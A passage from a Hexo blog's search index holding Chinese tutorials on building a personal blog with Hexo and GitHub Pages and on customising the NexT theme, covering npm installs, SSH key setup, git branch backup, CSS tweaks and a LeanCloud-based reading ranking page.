打开主题配置文件，修改为以下内容： 这样就能实现在主页只展示部分文字，其他文字隐藏起来，通过点击’阅读更多’来阅读全文。在写每一篇文章的时候，也要在必要的地方添加&lt;!-- more --&gt;123456789101112131415---title: 使用Github+Hexo搭建你的个人博客：搭建篇copyright: truedate: 2019-07-21 15:25:12categories: Hexotags: [GitHub,个人博客,Hexo]---&lt;blockquote class="blockquote-center"&gt;海阔凭鱼跃，天高任鸟飞。&lt;/blockquote&gt; 早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。&lt;!-- more --&gt;文章链接唯一化 也许你会数次更改文章题目或者变更文章发布时间，在默认设置下，文章链接都会改变，不利于搜索引擎收录，也不利于分享。唯一永久链接才是更好的选择。 首先安装插件1npm install hexo-abbrlink --save 然后在站点配置文件中找到permalink，修改为如下内容：1permalink: posts/:abbrlink/ # “posts/” 可自行更换 这里有个知识点：百度蜘蛛抓取网页的规则: 对于蜘蛛说网页权重越高、信用度越高抓取越频繁，例如网站的首页和内页。蜘蛛先抓取网站的首页，因为首页权重更高，并且大部分的链接都是指向首页。然后通过首页抓取网站的内页，并不是所有内页蜘蛛都会去抓取。 搜索引擎认为对于一般的中小型站点，3层足够承受所有的内容了，所以蜘蛛经常抓取的内容是前三层，而超过三层的内容蜘蛛认为那些内容并不重要，所以不经常爬取。出于这个原因所以permalink后面跟着的最好不要超过2个斜杠。 接着在站点配置文件中添加如下代码:123# abbrlink configabbrlink: alg: crc32 # 算法：crc16(default) and crc32rep: hex # 进制：dec(default) and hex可选择模式：crc16 &amp; hexcrc16 &amp; deccrc32 &amp; hexcrc32 &amp; dec修改顶端的线条颜色 next主题顶端的线条颜色默认是黑色的，我看着不舒服就把它改成了粉色效果图实现方法 打开themes/next/source/css/_variables/base.styl,找到headband，修改为以下内容：1234// Headband// --------------------------------------------------$headband-height = 2px$headband-bg = #e3cae4去除文章下方分类于的下划线 打开themes/next/source/css/_common/scaffolding/base.styl,找到span.exturl，修改为以下内容：12345678a, span.exturl &#123; word-wrap(); // Remove the gray background color from active links in IE 10. background-color: transparent; color: #999999; text-decoration: none; outline: none; border-bottom: 0px solid $link-decoration-color;左侧社交图标居中 强迫症的我居然发现了左侧社交图标似乎不太居中啊，一定得把它搞居中。效果图实现方法 打开themes/next/source/css/_schemes/Pisces/_sidebar.styl,找到.site-overview，修改为以下内容：1234.site-overview &#123; //margin: 0 2px; text-align:&#125;建立阅读排行榜 新建一个阅读排行榜界面，，用于显示本站文章的阅读排行榜，基于lencloud进行统计新建页面 hexo n page top 新建页面，生成 top 目录，编辑其中自动生成的 index.md 文件，将其中的代码替换如下：12345678910111213141516171819202122232425&lt;div id="top"&gt;&lt;/div&gt;&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("leancloud_appid这里填入你的id", "leancloud_appkey这里填入你的key");&lt;/script&gt;&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter'); query.notEqualTo('id',0); query.descending('time'); query.limit(1000); query.find().then(function (todo) &#123; for (var i=0;i&lt;1000;i++)&#123; var result=todo[i].attributes; time=result.time; title=result.title; url=result.url; // var content="&lt;a href='"+"https://hoxis.github.io"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;br&gt;"+"&lt;font color='#fff'&gt;"+"阅读次数："+time+"&lt;/font&gt;"+"&lt;br&gt;&lt;br&gt;"; var content="&lt;p&gt;"+"&lt;font color='#e20404'&gt;"+"【热度"+time+"℃】"+"："+"&lt;a href='"+"https://xiaoxiaoxiaoxiaolin.github.io"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;/p&gt;"; document.getElementById("top").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt; 里面的leancloud_appid、leancloud_appkey 还有页面链接记得替换成你的。编辑菜单 打开主题配置文件，添加top：1234567menu: home: / || home top: /top/ || signal categories: /categories/ || th tags: /tags/ || tags archives: /archives/ || archive about: /about/ || user 然后还需要对中文配置hexo/blog/themes/next/languages/zh-CN.yml进行修改，添加top对应的中文：1234567891011menu: home: 首页 top: 热榜 archives: 归档 categories: 分类 tags: 标签 about: 关于 search: 搜索 schedule: 日程表 sitemap: 站点地图 commonweal: 公益 404github分支管理博客 使用hexo发布博客最麻烦的地方在于，当你换了一台电脑后又想发布博客，又得把先前的环境重新搭建，拉取仓库。因为在github中的我们github.io项目是只有编译后的文件的，没有源文件的，也就是说，如果我们的电脑坏了，打不开了，我们的博客就不能进行更新了，所以我们要把我们的源文件也上传到github上。这个时候可以选择新建一个仓库来存放源文件，也可以把源文件 push 到 user.github.io 的其他分支。我选择了后者。创建分支 创建两个分支：master 与 hexo,（这个hexo分支就是存放我们源文件的分支，我们只需要更新hexo分支上的内容据就好，master上的分支hexo编译的时候会更新的）初始化仓库 然后我们再初始化仓库，重新对我们的代码进行版本控制12git initgit remote add origin &lt;server&gt; &lt;server&gt;是指在线仓库的地址。origin是本地分支,remote add操作会将本地仓库映射到云端将博客源文件上传到分支 .gitignore文件作用是声明不被git记录的文件，blog根目录下的.gitignore是hexo初始化带来的，可以先删除或者直接编辑，对hexo不会有影响。建议.gitignore内添加以下内容：123/.deploy_git/public/_config.yml .deploy_git是hexo默认的.git配置文件夹，不需要同步 public内文件是根据source文件夹内容自动生成，不需要备份，不然每次改动内容太多 即使是私有仓库，除去在线服务商员工可以看到的风险外，还有云服务商被攻击造成泄漏等可能，所以不建议将配置文件传上去依次执行123git add .git commit -m "..."git push origin hexo更改标签云的颜色 打开/blog/themes/next/layout/page.swig，找到tagcloud，修改为以下内容：1&#123;&#123; tagcloud(&#123;min_font: 13, max_font: 31, amount: 1000, color: true, start_color: '#9733EE', end_color: '#FF512F'&#125;) &#125;&#125; start_color和end_color的颜色你可以自己随意定义。参考资料：使用 Hexo 搭建 GitHub Page 博客(二)–使用 GitHub 分支保存 Hexo 环境和博文hexo 摸爬滚打之进阶教程GitHub–创建新的分支(转)打造个性超赞博客 Hexo + NexT + GitHub Pages 的超深度优化hexo的next主题个性化教程:打造炫酷网站 | Moorez4块钱,用Github+Hexo搭建你的个人博客：美化篇还有一些参考的资料链接已经找不到了，所以就不一一列出了。第一次写，如有错误，欢迎指出，不胜感激。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>个人博客</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Github+Hexo搭建你的个人博客：搭建篇]]></title>
    <url>%2Fposts%2F9464af1e.html%2F</url>
    <content type="text"><![CDATA[海阔凭鱼跃，天高任鸟飞 早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。 其实早在放假之前，我就一直在捣鼓自己的博客了，使用的是Django。搞了好一阵子，就只剩一些细节的问题，准备上线的时候，Hexo出现在我的眼前,简约的风格一下子吸引了我，这正是我想要的。好了，别说了，我改还不行吗，就这样我已经搭好准备上线的Django，转入Hexo。自己建站的原因 网上这么多现成的博客不用，为什么非得浪费这么多时间去自己搭建呢？ 可能会有人这样说：很多网站都能写博客，干嘛这么浪费时间呢？ 在这里我说一下我想自己搭建的原因: 1、网上大部分的博客功能都是差不多的，但是限制也是挺多的，花里胡哨的广告，文章不管是自己还是别人看，体验都很不舒服。 2、除了广告的原因，排版的限制以外，拥有一个自己可以随意定制的博客网站，内容和排版都自己可以随意决定，是不是很酷。 除此以外，自己在这段时间确实学习到了很多。宅在家里好一段时间，除了吃饭睡觉就是搭建自己的博客。搭建博客也是成为了我学习的动力，现在搭建好了之后，也不会觉得没有事情干，相反，会因为博客的空白而继续努力学习、写博客、写自己的想法，努力让自己的博客、生活、还有学习充实起来。开始搭建博客什么是Hexo？ Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。环境部署Hexo安装前提 安装 Hexo 相当简单。然而在安装前，必须检查电脑中是否已安装下列应用程序：Node.js (Should be at least nodejs 6.9)Git 如果你的电脑中已经安装上述必备程序，那么恭喜！接下来只需要使用 npm 即可完成 Hexo 的安装。1npm install -g hexo-cli 如果你的电脑中尚未安装所需要的程序，请自行百度或者Google完成安装。 安装好所有环境之后，可以用以下命令是否安装成功，如果有返回版本信息说明安装成功。123git versionnode -vnpm -vHexo安装安装hexo 桌面右键点击git bash here，打开git软件界面，输入以下命令并回车：12npm install hexo-cli -gnpm install hexo-deployer-git --save 第一句是安装hexo，第二句是安装hexo部署到git page的deployer。设置博客存放的目录1234hexo init /h/blogcd /h/blognpm install*注：/h/bog可以更改为你自己的文件夹* 有的教程是先建立起博客的文件夹，再在该文件夹下右键鼠标，点击Git Bash Here，进入Git命令框，再执行以下操作。操作因人而异，没多大影响，只要能成功搭建就没问题了。查看博客的效果 至此，一个博客就初步搭建好了，先预览一下：1hexo g &amp;&amp; hexo s 然后在浏览器中打开：localhost:4000就可以看到博客的样子了。 打开该网址，你可以看到第一篇默认的博客：Hello World。虽然看起来有点难看，但是后续我们可以通过重新选择模板来对博客进行美化。把博客部署到GitHubGithub账号注册及配置 如果你没有github帐号，就新建一个，然后去邮箱进行验证；如果你有帐号则直接登录。官网：https://github.com/建立new repository 只填写username.github.io即可，然后点击create repositrory。 注意：username.github.io 的username要和用户名保持一致，不然后面会失败。以我的为例：开启gh-pages功能 点击github主页点击头像下面的profile,找到新建立的username.github.io文件打开，点击settings，往下拉动鼠标到GitHub Pages。如果你看到上方出现以下警告：GitHub Pages is currently disabled. You must first add content to your repository before you can publish a GitHub Pages site 不用管，点击选择choose a theme，随便选择一个，然后select theme保存就行了。配置ssh密钥 配置Github的SSH密钥可以让本地git项目与远程的github建立联系，让我们在本地写了代码之后直接通过git操作就可以实现本地代码库与Github代码库同步。操作如下：看看是否存在SSH密钥 首先，我们需要看看是否看看本机是否存在SSH keys,打开Git Bash,并运行：1cd ~/. ssh 检查你本机用户home目录下是否存在.ssh目录 如果，不存在此目录，则进行第二步操作，否则，你本机已经存在ssh公钥和私钥，可以略过第二步，直接进入第三步操作。创建一对新的SSH密钥12$ssh-keygen -t rsa -C "your_email@example.com"#这将按照你提供的邮箱地址，创建一对密钥，记得修改 直接回车，则将密钥按默认文件进行存储。此时也可以输入指定的文件夹。然后根据提示，你需要输入密码和确认密码，其实可以不用密码，就是到输密码的地方，都直接回车，所以每次push就只管回车就行了。跟着提示操作就对了，这里没什么坑。在GitHub账户中添加公钥 运行如下命令，并将公钥的内容复制。1clip &lt; ~/.ssh/id_rsa.pub登陆GitHub，进入账户设置，在SSH Keys粘贴添加就可以了测试 输入以下命令，看看[设置是否成功，git@github.com的部分不要修改：1$ ssh -T git@github.comThe authenticity of host ‘github.com (207.97.227.239)’ can’t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? 如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。设置用户信息 现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字根据自己的喜好自己取，而不是GitHub的昵称。12$ git config --global user.name "你的用户名"//用户名$ git config --global user.email "你的邮箱"//填写自己的邮箱将本地的Hexo文件更新到GitHub的库中 SSH Key配置成功后，接下来我们要把本地的Hexo文件上传到GitHub库中。 打开Hexo文件夹下的_config.yml，这个是博客的配置文件，添加你的GitHub page url 然后执行以下命令：1hexo g &amp;&amp; hexo d 或者 hexo g -d 此时在浏览器打开你的主页地址，你就能看到你的博客了。写下自己的第一篇博客 接下来你可以在博客的根目录下运行命令：1hexo new "第一篇博客" 然后打开D:\blog\source\_posts文件夹，就可以看到一个第一篇博客.md的文件，用支持markdown语法的软件打开该文件进行编辑即可。 编辑好以后，运行下述命令：1hexo clean &amp;&amp; hexo d -g 然后，在网址中输入username.github.io即可看到你的博客上，出现“第一篇博客”这篇新的文章。 至此，你的个人博客初步搭建过程就完成了。相关补充 在以后的博客发布，都是需要使用Markdown语法去写的，所以我们需要对markdown有所了解。 关于markdown的语法介绍可以看看这篇文章：markdown——入门指南 当你大致了解markdown语法后，如何用markdown写博客呢？不妨参考这两篇详细教程：Markdown语法说明Hexo下的Markdown语法(GFM)写博客 接下来你还得需要一个高效的markdown软件，这里我是用的是Typora，安装好后就可以打开刚刚的第一篇博客.md，开始尝试写你的第一篇博客了。 写完之后，别忘了在博客根目录下再次运行：1hexo clean &amp;&amp; hexo d -g 到这里，博客的初步搭建就算完成了，如果中间出现差错，请保持耐心多试几次，办法总比问题多嘛！关于Hexo的一些了解和常用命令，请自行查阅官方文档，一般可解决大部分的问题。 此时，还有一个比较重要的问题就是，博客的美化问题，下一篇文章，我会以我的博客为例，讲一讲我的博客是如何进行美化的。 第一次写博客，如有问题，欢迎指出，谢谢各位大佬，我会继续努力的。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>个人博客</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
